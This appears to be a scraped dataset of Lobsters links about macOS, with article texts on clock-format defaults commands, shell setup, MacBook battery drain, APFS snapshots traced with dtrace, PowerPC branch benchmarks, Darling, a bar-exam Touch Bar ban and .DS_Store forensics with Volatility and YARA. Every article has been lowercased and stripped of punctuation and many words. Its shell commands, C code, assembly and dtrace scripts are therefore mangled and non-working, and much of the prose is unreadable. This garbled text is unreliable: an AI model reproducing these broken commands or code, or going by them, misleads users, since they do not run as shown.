comapplemenuextraclock dateformat string hh mm thu aug pm system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week checked eee system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string eee mmm h mm thu pm system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week checked eee system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string eee h mm aug pm system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week unchecked system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string mmm h mm pm system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week unchecked system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string h mm thu aug system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string eee mmm h mm thu system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string eee h mm aug system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string mmm h mm system preference date time display time second unchecked system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string h mm apply change immediately sudo killall systemuiserver source terminal ring terminal bell ring terminal bell enabled put badge alternative terminal alacritty crossplatform gpuaccelerated terminal emulator better terminalapp kitty modern gpuaccelerated terminal emulator shell bash install latest version set current user default shell brew install bash echo brew prefix binbash sudo tee etcshells chsh brew prefix binbash homepage default shell o x unixbased operating system bashit community bash framework like oh zsh bash fish install latest version set current user default shell brew install fish echo brew prefix binfish sudo tee etcshells chsh brew prefix binfish homepage smart userfriendly command line shell o x linux rest family fishshell framework provides core infrastructure allow install package extend modify look shell installation configuration tutorial setup fish shell fisherman powerline font budspencer theme o x zsh install latest version set current user default shell brew install zsh sudo sh c echo brew prefix binzsh etcshells chsh brew prefix binzsh homepage zsh shell designed interactive use although also powerful scripting language oh zsh open source communitydriven framework managing zsh configuration prezto speedy zsh framework enriches command line interface environment sane default alias function auto completion prompt theme zgen another open source framework managing zsh configuration zgen load ohmyzsh compatible plugins theme advantage faster automatically cloning plugins used configuration terminal font anonymous pro family four fixedwidth font designed coding mind codeface gallery repository monospaced font developer dejavu sans mono font family based vera font fantasque sans mono designed functionality mind wibblywobbly handwritinglike fuzziness make unassumingly cool hack hack hand groomed optically balanced goto code face inconsolata monospace font designed code listing like input flexible system font designed specifically code meslo customized version apple menlo font operator mono surprisingly usable alternative take monospace font commercial powerline font repo patched font powerline plugin source code pro monospaced font family user interface coding environment glossary mac o x o x macos version information version codename release date recent version rhapsody developer release august may mac o x server hera march october mac o x developer preview na march april mac o x public beta kodiak september na mac o x cheetah march june mac o x puma september june mac o x jaguar august october mac o x panther october april mac o x tiger april november mac o x leopard october august mac o x snow leopard august july mac o x lion july september o x mountain lion july october o x maverick october september o x yosemite october august o x el capitan september july macos sierra september july macos high sierra september july macos mojave september january macos catalina october june license work licensed creative common attributionsharealike international license
451,Lobsters,mac,Apple macOS,New Macbook Pro power efficiency & time remaining,https://macdaddy.io/new-mbp-power-efficiency-impressive/,new macbook pro power efficiency time remaining,battery guru see apple statement newer cpu causing unpredictable calculation around hour battery guru,new mbp power efficiency impressive mbp switched mbp one contentious issue particularly interested battery life author battery guru around long time used mbp become accustomed seeing much battery mbp us realtime normal condition know exactly apple intel done right power drain low usage condition around half previous mbp drew accustomed seeing milliamps least drawn given point previous mbp power draw would frequently sit around see happily sitting minute time anyone unfamiliar terminology mbp come mah battery mah mean deliver milliamps hour battery drain sustained hour battery drain sustained hour see sitting mere show battery going last full hour average load increase fortunately power management status code open source see take look populatetimeremaining find discharging h mahma b swcalculatedtr double b currentcap double b avgamperage running equation shown annotated image although newer battery time remaining prediction built available battery status set use instead making prediction reality neither advantage accuracy side note interesting see thorough smart modern smart battery even know nothing programming see battery monitoring reporting glancing constant name function monitor report everything temperature cell cell imbalance failure even reporting blown fuse extracted apple source code file linked also note coded support multiple battery loop external battery pack well internal battery calculate percentage remaining apple release external battery would already fully supported operating system finally calculated software time remaining estimation manually capped hour also batterytimeremainingc cap time remaining hour nt ship hour battery yet kmaxbattminutes b swcalculatedtr b swcalculatedtr kmaxbattminutes given time remaining calculation calculated using nothing battery drain average recent time reason behind apple statement newer cpu causing unpredictable calculation think would sometimes cpu move higher power state minute time remaining estimate get updated period inaccurate cpu switch low power state spends majority time vice versa answer leaf question hanging reducing power draw rather increasing mah power storage effective way increase battery life would go long way explain manufacturer obsession thinness electrical term often directly translates efficiency ie smallness device rather giving u something endures idea forwardlooking writing article put mbp mbp side side ran similar condition mbp idling mbp idling turned brightness way level v would lead idea efficient display partly responsible energy saving article intended rigorous benchmarking rather observation long time author real time battery drain software paying close attention field year impressed new mbp happily sit power draw long stretch time greater improvement would thought possible line consumer report saying would get around hour laptop single charge also line people reporting high load new mbp last shorter amount time earlier model smaller battery performant high stress use resource drain battery quickly suggestion anyone looking maximize battery life new mbp would keep eye unnecessary resource usage personally find frequent culprit processor usage power drain inadvertently leaving chrome tab open running gif background thing making least one cpu core sit usage find battery guru free running menu bar develop subconscious habit keeping eye realtime battery drain hunting errant process eating battery time something even using chewing resource anyway advent usbc make high quality power bank laptop feasible ever read source code power management prediction apple releasing external battery pack soon even third party manufacturer certainly
452,Lobsters,mac,Apple macOS,Testing out snapshots in Apple’s next-generation APFS file system,https://arstechnica.com/apple/2017/02/testing-out-snapshots-in-apples-next-generation-apfs-file-system/,testing snapshot apple nextgeneration apfs file system,enlarge apple file system brand new day io use apfs ascribed wrote game afoot dynamic tracing facility protected sip file xnu first snapshot github repo,enlarge saying apfs snapshot used future revision time machine betting person might good time place betsaurich thinkstock back june apple announced new upcoming file system apfs apple file system mention wwdc keynote devotee needed encouragement picked every scintilla data documentation apple developer site extrapolating interpolating eager whatever come wwdc session hall crowd buzzed nervous energy eager grand unveiling apfs badgeswapped way conference get first glimpse apple first original filesystem year since hf apple presentation disappoint hungry crowd hoped modern filesystem optimized next generation hardware rich feature become norm data center professional apfs apple showed path meeting expectation dominic giampaolo eric tamura leader apfs team shared performance optimization data integrity design volume management efficient storage copied data feature apfs directly user control far vaporware apple made apfs available registered developer day company included macos sierra technology preview play apfs today lot feature use space sharing carve single disk multiple volume see speed directory size slow process hf use clone make constanttime copy file directory wwdc apple demonstrated feature folk eager play snapshot tamura used snapshotutil create list mount snapshot early adopter quickly discovered snapshotutil part apfs technology preview apple promised delivery doublechecked hf backup waited brand new day apple already appears making good promise revelation forthcoming io use apfs number apfs tinkerer using personal data instantly gone hundred million beta user io already made switch apparently without incident even ascribed unscientificallysignificant performance improvement apfs apfs taking next step decided check back snapshot news apple nothing obviously new macos update back june wrote clue apple left macos sierra used dtrace technology increasingly amazed apple ported opensolaris find tantalizingly named new system call fssnapshot leave others reverse engineer proper use proper use still apparently mystery apfs freshly interest dove back game afoot first little background operating system roughly divide world kernel user process kernel part anything talk hardware device access memory execute privileged instruction short unfettered access kernel provides abstraction imposes security regular user process ever seen kerneltask activity monitor kernel using cpu memory resource user program everything else application run finder windowing system even dock piece modern parlance includes part operating system system call simply way user process communicate kernel program want write data disk get larger memory allocation need kernel verify permission execute task system call mechanism user process us note root user sudo still relates user process one kernel imbues greater privilege used dtrace find system call dtrace dynamic tracing facility coauthored sun bryan cantrill mike shapiro provides visibility whole system kernel device io java swift function call naturally dtrace includes visibility system call apple ported dtrace solaris typical mac hundred thousand probe discrete point instrumentation list dtrace l sudo dtrace l wc l note part dtrace protected sip need disabled use found system call interest looking dtrace systemcall probe sudo dtrace l n syscall entry grep snapshot syscall stacksnapshotwithconfig entry syscall fssnapshot entry dtrace incredibly powerful tool understanding system behaving however taking advantage dtrace show u definitive list system call also see fssnapshot system call file usrincludesyssyscallh need xcode developer tool installed grep fssnapshot usrincludesyssyscallh define sysfssnapshot little straightforward le definitive since guarantee code header file match running kernel simple google search fssnapshot immediately pointed right direction turning file xnu apple open source website xnu macos kernel came next run uname v see specific xnu version computer running well decade apple made xnu available open source done many macos component company known secrecy commendable apple built tradition transparency least subset software commendable quite boon anyone trying enable unpublished feature first snapshot learning xnu making educated guess wrote first c program create apfs snapshot section bit code find github repo include fcntlh include unistdh include syssyscallh int main int argc char argv int ret int dirfd open argv ordonly dirfd perror open exit ret syscall sysfssnapshot dirfd argv null null ret perror fssnapshot return test first created apfs volume mounted hdiutil create size f apfs volname apfs apfsdmg warning using prerelease version apple file system called apfs meant evaluation development purpose file stored volume may accessible future release o x back data using apfs regularly back data using apfs including upgrading future release o x continue yn created usersahlsrcapfssnapapfsdmg hdiutil mount apfsdmg guidpartitionscheme appleapfs volumesapfs mount grep volumesapfs volumesapfs apfs local nodev nosuid journaled noowners mounted ahl tried take first apfs snapshot outside apple know least firstsnap volumesapfs firstsnap fssnapshot operation permitted anticlimactic operation permitted error message corresponds error code eperm whose value need find error coming fortunately dtrace help u figure going dtrace us language describe probe action simple script comment clause usrsbindtrace pragma option flowindent thread call fssnapshot system call set threadlocal variable called follow syscall fssnapshot entry self follow every function entry return kernel many thread follow value set print first two argument offset return value return probe fbt self follow printf x x thread return fssnapshot system call set follow exit dtrace invocation thus removing instrumentation syscall fssnapshot return self follow self follow exit running dtrace script one terminal running snapshot program another show code flow kernel program executes sudo fssnapshotd dtrace script fssnapshotd matched probe cpu function fssnapshot vfscontextcurrent privcheckcred macprivcheck maclabelget lckrwunlockshared lckrwdonegen lckrwdonegen macpolicylistconditionalbusy macpolicylistconditionalbusy macprivgrant maclabelget lckrwunlockshared lckrwdonegen lckrwdonegen macpolicylistconditionalbusy macpolicylistconditionalbusy macprivgrant cd privcheckcred fssnapshot def fssnapshot note first dtrace turned discrete point instrumentation restore system optimal state experiment code flow privcheckcred function jump good place continue name fact fssnapshot call directly fact return corresponds eperm error getting looking xnu source code find delightful comment check credential privilege lot good reason deny privilege grant int privcheckcred kauthcredt cred int priv unused int flag apple engineer nt without particular brand humor walking function becomes clear fssnapshot expects run sudo world first nonapple snapshot take two sudo first volumesapfs firstsnap output work let try sudo first volumesapfs firstsnap fssnapshot file exists file exists let assume mean snapshot named firstsnap already exists success
453,Lobsters,mac,Apple macOS,An experiment: introducing the PopOutPlayer (plus: microbenchmarking PowerPC SPRs),http://tenfourfox.blogspot.com/2017/02/an-experiment-introducing-popoutplayer.html,experiment introducing popoutplayer plus microbenchmarking powerpc sprs,sandboxsafari quicktime enabler download,tenfourfox coming along operation short change initiative rework ionmonkey properly emit single branch instruction instead entire branch stanza target guaranteed range smoothing browser quite bit hundred place need changed finished macroassembler regular expression engine improved couple minor way working ion code generator mostly benefit system fit generated code cache quad comparatively large per core improved somewhere order expect lowend system hot code likely stay icache also planning put user agent support custodial improvement idea release beta testing around valentine day nt buy lot flower long back mentioned couple secret project one sandboxsafari intended followup obsolete mactubes enabler second project got backburnered awhile since noticing change may obsolete work done well going push door current state without ado let introduce popoutplayer photoshop see floating video window playing vimeo movie tenfourfox builtin codec fact think way play vimeo movie tiger neither safari omniweb work either yes work fine youtube also drop application apps folder drop popoutplayer enabler addon tenfourfox vimeo youtube page embedded video rightclick shiftrightclick select pop video video float window top window close browser tab go look something else video play playback completely independent process open another video window pop location left multiprocessor power mac even get scheduled another core even smoother playback sound great right well reason nt released earlier first app actually feeling ill writing based site flash player flash reliable way playback even performant native webkit also substantially fewer user interface problem risk sometimes crashy flash safer condemned browser learned lesson sandboxsafari popoutplayer actually descendant remember window location mean run app uid eliminates sandboxsafari primary mean protection also advantage needing support two specific video player applet design restrictive environment protects app subverted reject running video flash applet source different type sandbox implement restriction notably preventing applet going fullscreen necessity reborn virtue system would well fullscreen playback let alone hd also blockedunsupported prevents subverted player monkeying rest screen sandbox nt let url open applet either mach exception handler cgeventtap filter possible avenue exploit however also mean ca nt many thing would expect flash player embedded browser wo nt change window fixedsize float allowing window resize caused lot problem applet nt expect deal possibility get one size matter big screen close move although popoutplayer play youtube video quicktime enabler still many play though least flash player give explanation vevo one notorious popoutplayer also nt intended generic video playback nt replace qte sense qte still official video solution general application reject passing url video site really big limitation however could get vimeo applet run using hack devised leopard webkit play vimeo video lost matter tried popoutplayer simply would nt display video time vimeo url leopard generate unsupported video url message quite possible might never able fixed current method popoutplayer us display nt expect necessarily repaired future matter vimeo ondemand nt even work consider popoutplayer highly experimental vimeo youtube decommission flash player abruptly cease work without warning expect time coming sooner later welcome use popoutplayer long benefit solve issue might even make supported option future nt hold breath download unsupported source code currently available back tenfourfox would permit indulge gratuitous nerderosity part operation short change also explore whether branch stanza far call could made efficient currently target branch instruction exceeds displacement branch instruction ie b l bc l encode load target general purpose register gpr transfer counter register special purpose register spr branch ie lisorimtctrb c ctr l powerpc isa allow directly branching gpr fpr counter register ctr link register lr sprs would well good except group instruction together ibm warns substantial execution penalty mtctr b c ctr l dispatch group since mtspr instruction like mtctr must always lead dispatch group stanza guaranteed put together recall instruction dispatch group four five branch branch last slot faster insert nops accept code bloat using link register instead time assembly language microbenchmarking define rep main globl main mflr stwu li li rep bl location following mflr mflr addi point addi addi cmp beq done uselr mtlr usenops nop nop nop nop endif blr else mtctr usenops nop nop nop nop endif bctr endif done lwz mtlr li addi blr run tight loop time branching loop header either lr ctr mtspr instruction separated blrbctr sufficient nops put separate dispatch group must four prevent branch getting terminal branch slot give u four variation test loop tight cost branch substantially weigh total runtime let see get following along power mac compile like gcc lrctrctr lrctrs gcc dusenops lrctrctrn lrctrs gcc duselr lrctrlr lrctrs gcc duselr dusenops lrctrlrn lrctrs want confirm actually assembled look result otool tv control trusty imac cache difference sprs fit cache dispatch group right runtimes nearly identical case interested user cpu time first field luxojr time lrctrctr luxojr time lrctrctrn luxojr time lrctrlr luxojr time lrctrlrn excellent let run quad number reduced performance mode bruce time lrctrctr bruce time lrctrctrn bruce time lrctrlr bruce time lrctrlrn wait putting mtctr bctr dispatch group actually fastest four variation using lr slower three time slower even spacing two ctr instruction apart marginally worse see artifact throttling ran highest performance thing bruce time lrctrctr bruce time lrctrctrn bruce time lrctrlr bruce time lrctrlrn found surprising rewrote aix put also dispatchgroup based us evolved version instruction pipeline derived well uppsala time lrctrctr uppsala time lrctrctrn uppsala time lrctrlr uppsala time lrctrlrn execution time consider run throttled asmi reduce power consumption microarchitectural difference relative run time hold actually faster space ctr branch nothing better could see ctr best spr use branching regardless penalty paid may well using lr foul cpu link cache thus tank runtime whatever explanation using far call clearly worst option may guessed deliberately presented false choice four option patently pathological optimal instruction sequence would schedule work mtctr bctr nt much work uh work one way define rep main globl main mflr stwu li li rep bl location following mflr mflr addi point mtctr mtctr addi cmp beq done bctr done lwz mtlr li addi blr bruce gcc ctrop ctrops bruce time ctrop almost identical runtimes reduced mode beq take branch slot away bctr guaranteeing spr operation split two dispatch group without trying space nops inexplicably coalesce beqbctr simply bnectr occupy branch slot get even faster bruce time optimal well luxojr time ctrop luxojr time uppsala time ctrop uppsala time yup though worth noting improve bnectr still pathological mind best instruction sequence would simply addicmpbne reduced mode run reclaiming speed crown far call nt choice moral story nt fix ai nt broke
454,Lobsters,mac,Apple macOS,GPGTools Beta Available For macOS Sierra,https://gpgtools.org/,gpgtools beta available macos sierra,gpg suite http gpgtoolstenderappcom,please download install latest version gpg suite copy activation code restart macos mail bring activation window enter email activation code macos mojave might necessary enable gpg mail manually macos mail preference general manage plugins question regarding gpg mail rest gpg suite please use report problem button mail preference gpg mail visit support platform http gpgtoolstenderappcom thank support really appreciate gpgtools team
455,Lobsters,mac,Apple macOS,There's Progress In 2017 For Running macOS Binaries On GNU/Linux,https://phoronix.com/scan.php?page=news_item&px=macOS-Darling-2017,progress running macos binary gnulinux,project run mac o x binary linux small update blog post update,five year ago wrote project run mac o x binary linux wine allowing window program linuxmacosetc darling want let mac binary run linux since last anything report project making new progress last year small update project darling endusers still left lot desired yet supporting mac gui application limited selection binary could run darling might change project darling luboš doležel shared working transition file macho rather sticking elf provide variety benefit macos translation layer linux darling also working containerization approach overlayfs two developer joined opensource project also experiment happening supporting gui macos apps linux interested learning current state project darling see blog post update
456,Lobsters,mac,Apple macOS,Law Students Must Disable MacBook Pro Touch Bar for 2017 Bar Exam,https://www.macrumors.com/2017/01/30/macbook-pro-touch-bar-law-students/,law student must disable macbook pro touch bar bar exam,new notice statement,north carolina law student purchased one apple new macbook pro model include touch bar need disable much functionality able use macbooks upcoming bar examination according new notice put today board law examiner state north carolina according notice applicant need disable touch bar ability used apps system preference use computer take test touch bar need set expanded control strip display option like screen brightness volume control without allowing show appspecific content shift app notice applicant using laptop february north carolina bar examination planning use newest version mac book pro touch bar required disable touch bar feature prior entry bar examination site disable touch bar dock open system preference doubleclick keyboard open dropdown menu touch bar show select expanded control strip please advised announcing proctor make announcement start exam session asking anyone using mac book pro touch bar raise hand proctor examsoft technician come seat ensure touch bar disabled notice nt include reason touch bar functionality must limited statement board staff member said potential compromise security perhaps leading cheating anonymous source also told macrumors ban stem examsoft company responsible making sure test taker restricted access internet apps file one concern examsoft touch bar predictive text feature suggests word user according source macbook pro restricted test administered examsoft client update appears touch bar ban expands beyond north carolina even harsher state california committee bar examiner decided macbook pro touch bar ca nt used february examination sent notice test taker morning committee bar examiner advised macbook pro laptop touch bar contains certain embedded feature make problematic use upcoming february administration cbx result applicant allowed use macbook pro laptop touch bar february cbx according committee bar examiner applicant need find different laptop use test attempt use macbook pro touch bar receive score zero session allowed continue exam
457,Lobsters,mac,Apple macOS,Identifying Deleted File References in the Trash (.DS_Store) Files - Part 2,http://ponderthebits.com/2017/02/mac-dumpster-diving-identifying-deleted-file-references-in-the-trash-ds_store-files-part-2/,identifying deleted file reference trash dsstore file part,part blockblock sudo sift z l errskiplinelength blockblockinstallerapp latest release repository pluginsusersjpprojectsvolatilityvolatilityplugins f projectsmemorycapturesmemraw macyarascan projectsyaradsstoreyar yara p projectsyaradsstoreyar memraw hexdump c n memraw command line kung fu hal pomeranz grep task memorycapturesmemrawyaraoutput awk print sort uniq c sort r blockblock grep task finder memorycapturesmemrawyaraoutput sudo fsusage w f filesystem grep trashdsstore mkfifo partout gstrings td partout memorycapturesmemrawstringsascii cat memorycapturesmemraw tee partout gstrings td eb memorycapturesmemrawstringsbe sift memorycapturesmemrawstringsascii sift memorycapturesmemrawstringsbe pluginsusersjpprojectsvolatilityvolatilityplugins f projectsmemorycapturesmemraw macstrings projectsmemorycapturesmemrawstringsascii pluginsusersjpprojectsvolatilityvolatilityplugins f projectsmemorycapturesmemraw macstrings projectsmemorycapturesmemrawstringsasciifiltered wiki entry corresponding process conclusion,part post identified artifact reside along option parsing however still addressed whyhow anomaly occurs thus part post must test see howwhy occurs behavior seeing led following hypothesis testing although dsstore file deleted recreated created space disk within previously allocated block volume note situation often occurs window event log cleareddeleted event log file recreated recreated log file often inhabits area disk surrounding previously deleted entry may may relevant current log hand thus carving file entry yield various event entry dsstore entry stored somewhere else disk andor memory referenced repopulated within file upon recreation reason reason idea another theory might make sense please share hypothesis factual knowledge tested using stat command see deleted recreated dsstore file would occupy inode however still leave room possibility even though new inode associated file time recreated may still somehow occupying space disk tested ondisk aspect searching across file disk reference file previously deleted since reboot installer blockblock named blockblockinstallerapp following file stood sudo sift z l errskiplinelength blockblockinstallerapp file contain reference given file name none contained anything relevant research indicate culprit dsstore file entry repopulation issue aside last entry actually spotlight indexed cached evernote page using take note research note spotlight database cache directory also great place search reference deleted file well possibly include full content cached indexing moving tested inmemory aspect capturing memory image author separate blog post later system using volatility yarascan string plugins identify memory entry may reside debated showing end result figure merit showing got result well bonus everyone volatility yarascan plugin specifically macyarascan use mac image take yara rule file find match across memory image associated filesprocessesmemory area optionally dump resulting file analysis would seem rather useful situation trying identify memory historical deleted file reference currently exist begin created following yara rule file containing reference file deleted system whose entry still remain trashdsstore file rule dsstoresearches string blockblockinstallerapp filezillainstallerapp spotifyinstallerzip condition see installed program recently package deleted upon successful installation however entry continue repopulated back trashdsstore file system rebooted since deleted using latest release volatility standalone osx executable along custom macos sierra profile manually generated available mac profile repository use scanned memory image reference file using macyarascan plugin shown pluginsusersjpprojectsvolatilityvolatilityplugins f projectsmemorycapturesmemraw macyarascan projectsyaradsstoreyar going lie ran better part day core mba memory image expect speedy result running plugin begin sidebar comparison running yara image took minute however two tool different thing extent producing different result yara simply scanned image output location within memory hit identified yara p projectsyaradsstoreyar memraw blockblockinstallerapp blockblockinstallerapp blockblockinstallerapp blockblockinstallerapp blockblockinstallerapp filezillainstallerapp filezillainstallerapp filezillainstallerapp filezillainstallerapp filezillainstallerapp spotifyinstallerzip spotifyinstallerzip spotifyinstallerzip spotifyinstallerzip spotifyinstallerzip hit verified investigated hexdump hexdump c n memraw blockblockinsta ad llerapp dd ba e fa ef eb great show u historical reference exist across ton area within memory really help u identify useful context nonetheless yara incredibly useful tool variety purpose matter knowing tool one need given job end sidebar volatility macyarascan output provided lot useful result context needed sample entry task lsd pid rule dsstoresearches addr filezillainstal umesrecoveryhd ffprivatevar tmpmppzlprpio lyprivatetmp ddkjwyoepldev umesdocslodev pri vatetmprxstidx ablvolumesdoc ragusersjpdo identified reference file multitude process surprising amount actually may need revisited future research trying identify reference file within common processcontext next step bit analysis see processcontext least hit file name find bit command line kung fu got ta plug hal pomeranz site though cough need new entry cough yield following grep task memorycapturesmemrawyaraoutput awk print sort uniq c sort r finder blockblock md lsd google loginwindow coreservicesd systeminstalld sharingd revisiond pb mobileassetd mdworker crashpadhandler configd comapplegeod apsd airportd xprotectservice usereventagent submitdiaginfo microsoft weed anything le entry leaving google lsd md blockblock finder google lsd md process entry filezilla ruled blockblock actually awesome app patrick wardle objectivesee watch application attempt persistence surprise entry exist within memory space overseen installation alerted ifwhen persistence autostart mechanism implemented usefulness aside culprit left finder let see entry found within finder process machine grep task finder memorycapturesmemrawyaraoutput task finder pid rule dsstoresearches addr filezillainstal umesrecoveryhd ffprivatevar tmpmppzlprpio lyprivatetmp ddkjwyoepldev umesdocslodev pri vatetmprxstidx ablvolumesdoc ragusersjpdo task finder pid rule dsstoresearches addr blockblockinsta llerapp comobjectivese eblockblock g g g task finder pid rule dsstoresearches addr q ff ff dngadobenikond q ff ff cam q ff ff ff ff e q ff ff task finder pid rule dsstoresearches addr spotifyinstaller zip q ff ff h ab q ff ff dngadobecanone osmcam db ff c c c q ff ff installspotify app ff ff sure enough look like likely found harborer historical entry make sense surmise finder process responsible creating dsstore file moved trash might able find process responsible creating file osx nice little utility called fsusage monitor sort file system disk io aspect purposestesting going filter filesystem event grep trashdsstore file care go finder delete send trash file sudo fsusage w f filesystem grep trashdsstore fsgetpath usersjptrashdsstore fsgetpath usersjptrashdsstore getattrlist usersjptrashdsstore fsgetpath usersjptrashdsstore getattrlist usersjptrashdsstore fsgetpath usersjptrashdsstore fsgetpath usersjptrashdsstore open w usersjptrashdsstore hfsupdate usersjptrashdsstore hfsupdate mncm usersjptrashdsstore hfsupdate n usersjptrashdsstore hfsupdate ncm usersjptrashdsstore hfsupdate fmncm usersjptrashdsstore getattrlist usersjptrashdsstore wrdata usersjptrashdsstore w fsgetpath usersjptrashdsstore usersjptrashdsstore sure enough see finder creating trashdsstore file pretty cool huh entry repopulated instead creating blankzero ed file yet quite know would take intensive inspection finder code nonetheless finder process definitely look like solid candidate responsible storing historical entry even testing corroboration finding additional corroboration always good idea investigation research use volatility string plugin effective use plugin actually relies string output file fed input plugin string entry prepended decimal offset found eg filedmg keep mind addition standard ascii string also want extract unicode big endian string well use gnu string utility gstrings osx via brew acquire needed output bit protip great way extract ascii unicode big endian parallel using fifo queue mkfifo partout gstrings td partout memorycapturesmemrawstringsascii cat memorycapturesmemraw tee partout gstrings td eb memorycapturesmemrawstringsbe completed let check format see found ascii unicode bigendian string sift memorycapturesmemrawstringsascii e file file file file file file file file file file file file file file file file file file file file unicode bigendian sift memorycapturesmemrawstringsbe ile saw running yara scan memory find many resident artifact file name string bit le unicode output possibly useful finding nonetheless surprise let feed volatility string plugin get context pluginsusersjpprojectsvolatilityvolatilityplugins f projectsmemorycapturesmemraw macstrings projectsmemorycapturesmemrawstringsascii one two schrödinger cat got best killed process receiving protip attrc filter string file cared file name put int yara rule file whittled approximately string entry million gah reran pluginsusersjpprojectsvolatilityvolatilityplugins f projectsmemorycapturesmemraw macstrings projectsmemorycapturesmemrawstringsasciifiltered waited another day killing instead running much faster desktop machine ala still took day run core memory yielded following output kernel kernel kernel file spotifyinstallerzip kernel file filezillainstallerapp kernel file blockblockinstallerapp kernel file filezillainstallerapp kernel usersjpdownloadsfilezillainstallerap kernel file blockblockinstallerapp kernel file blockblockinstallerapp kernel file blockblockinstallerapp kernel file kernel file kernel blockblockinstallerapp kernel process association well unfortunately le useful u according wiki entry string plugin given image file line form output corresponding process virtual address string found reading expected output similar better yarascan plugin able pair string hit associated process ala ti case nonetheless seem useful finding satisfy hypothesis conclusion conclusion hypothesis look rather satisfied testing still left following question entry repopulated dsstore file recreated cause behavior information pulled recreated dsstore file certain file resident every file ever deleted machine testing show entry purged upon reboot last question mostly answered though still know happens anyone insight would incredibly interested hear jp
458,Lobsters,mac,Apple macOS,Identifying Deleted File References in the Trash (.DS_Store) Files - Part 1,http://ponderthebits.com/2017/01/mac-dumpster-diving-identifying-deleted-file-references-in-the-trash-ds_store-files-part-1/,identifying deleted file reference trash dsstore file part,dsstore file put back mac deletes historical entry repopulated file rewind bit jp jpmba string trashdsstore jp jpmba man string know tool linux gnu v mac bsd command line utility native utility jp jpmba hexdump c trashdsstore make sense output format thirdparty utility gnu string homebrew installing coreutils using fdb using dsstore go parser slavik demisto using dsstoreparser nicole ibrahim comparing dsstore parsing solution wrapping part,ever plugged usb drive mac done thing plugged window system doubt seen viewing hidden file enabled various dsstore file among others strewn throughout folder drive though essentially useless window system fact serve particular purpose hf file system reinvent wheel describing dsstore file well would like highlight possible use dfir containingreferencing artifact may useful investigation trace deleted file filename sometimes path nutshell dsstore file store metadata used finder folderspecific display option window placement layout custom icon background etc created parent folder folder viewed using icon list gallery view within finder note dsstore file created viewing folder column view example opened musicitunes folder finder gallery view dsstore file would created musicdsstore thus dsstore file theoretically created every folder finder access including remote network share external device annoying dsstore file see window thumb drive making sense part metadata filename got wonder whether trace get left behind file moved deleted postresearch focused solely deletion aspect user deletes file finder testing system o x macos sierra file get deleted finder via rm command line different story first get moved user trash folder least one file already exists within user trash entry yettobedeleted file added existing trashdsstore file denoting full path disk file resided moved trash entry part put back feature work file currently exist trash due user previously emptying trash assumed bit new dsstore file would created new meaning clearempty file begin storing entry put back upon emptying trash via either empty trash secure empty trash option finder presierra system file deleted according deletion method associated action trash folder trashdsstore file also deleted stay tuned put quote great little writeup hf volume structure happens mac deletes point since trash source file deleted upon emptying trash would assume dsstore file entry would deleted well case answer quite testing source data file within trash folder appear reliably deleted short carving disk various file path entry within trashdsstore file appear deleted fact move another file trash trashdsstore file recreated historical entry repopulated file even put back file associated dsstore file entry remain win note appeared file deleted since last reboot machine rebooting machine seems finally remove historical entry various hypothesis whyhow happens entry come tested later post opportunity identify reference historical file deletion sometimes full path apply trash dsstore file either applies given directory dsstore file may contain contained reference file existed within pretty awesome right many already putting together find command identify dsstore file system hint find name dsstore kinda started whole story end well finished muddling way researching experimenting find actually parse dsstore file let rewind upon first look dsstore file exactly straight forward apparently opened native system tool application native dsstoreviewer utility simply par file information command line would even go trying figure parse thing well turn dsstore format documented given format published likely parser already exists sometimes like see find go easy er route start exploring inside file initial thought may string solid idea start let see jp jpmba string trashdsstore pptbnustr gptblustr xptblustr xptbnustr gptbnustr dsdb gptbnustr gptblustr gptbnustr gptblustr gptbnustr fptblustr well le useful oh maybe unicode string instead ascii let see option unix string search unicode string instead ascii jp jpmba man string point may already know say bsd string utility capability search unicode string see post know tool linux gnu v mac bsd command line utility fail go different way stick native utility installuse thirdparty utility identify unicode string particularly bigendian unicode installuse thirdparty utility directly read dsstore format file native utility else might exist use view string doubt hex typically use two native hex viewer hexdump xxd useful different way start hexdump using hexdump dump hexascii following hexdump c jp jpmba hexdump c trashdsstore n ease docusig nthisd see notable header followed readable text score extract readable text effective way mess around hexdump try make sense output format could like get overwhelmed one point use xxd create incredibly unpretty certainly le efficient convoluted working oneliner xxd p pathtodsstore sed tr n sed g xxd r p string sed sptb ln ustrg voilà string output unicode string using builtin utility ugly certainly separating pointslines get get least legibly make filename path could get somewhere ugly hack recommend sometimes ugly better nothing ymmv note would interested someone way versed hexdump output formatting would create much simpler way solely using hexdump utility thirdparty utility gnu string believe actually install various gnu utility mac via handy little thing called homebrew take command line oneliner install open mac world new useful utility called formula note xcode prereq installing homebrew purpose want install string part gnu coreutils package homebrew installed take brew install coreutils running note various gnu utility prepended g due naming conflict example gnu string utility must calledrun gstrings yeah laugh little time see installed full gnu string capability namely searching bigendian unicode text la following gstrings eb necessarily need option tell string care whether think searchable file anyway add habit searching file system like gripe using fdb http digininjaprojectsfdbphp enter cpan shell perl mcpan e shell install dsstore cpan install mac finder dsstore install switch cpan install switch run fdb fdbpl type d filename userstrashdsstore baseurl user using dsstore go parser http githubcomgehaxeltdsstore download install go download o x package http golangorgdl set go path shell onetime set mine following export gopathprojectsgo permanent place line etcbashrc reload shell source etcbashrc close relaunch terminal download dsstore go file go get githubcomgehaxeltdsstore change directory go project cd gopathsrcgithubcomgehaxeltdsstore make directory new projectfiles opted name mine dsdump feel free alter cd mkdir p bindsdump cd already done create go file named mine dsdumpgo copypaste example code http githubcomgehaxeltdsstore nano dsdumpgo copypaste example code file save build go binary go build run dsump dsump pathtodsstore note one awesome thing go ability build static binary additional file needed variety operating system example wanted build binary window system 